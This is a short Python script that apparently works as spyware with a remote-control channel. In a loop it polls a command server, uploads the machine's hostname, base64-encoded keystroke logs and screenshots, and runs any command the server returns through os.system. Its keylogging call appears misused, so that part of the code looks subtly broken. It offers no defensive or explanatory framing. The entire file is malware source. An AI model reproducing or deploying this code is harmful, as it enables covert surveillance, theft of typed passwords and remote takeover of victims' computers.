import requests, keyboard, time, os, base64, uuid, socket
from PIL import ImageGrab
u='http://localhost:8000'
i=str(uuid.uuid4())
while 1:
 try:
  r=requests.get(f'{u}/r')
  if r.status_code==200:
   d={'id':i,'host':socket.gethostname()}
   if os.path.exists('k.txt'):d['keys']=base64.b64encode(open('k.txt','rb').read()).decode()
   if os.path.exists('s.png'):d['shot']=base64.b64encode(open('s.png','rb').read()).decode()
   r=requests.post(f'{u}',json=d)
   c=r.json().get('cmd','')
   if c:os.system(c);requests.put(f'{u}?id={i}',data=base64.b64encode(c.encode()))
   if not os.path.exists('k.txt'):open('k.txt','w').write('')
   keyboard.write(lambda e:open('k.txt','a').write(e.name+'\n') if e.event_type=='down' else '')
   ImageGrab.grab().save('s.png')
 except:pass
 time.sleep(5)
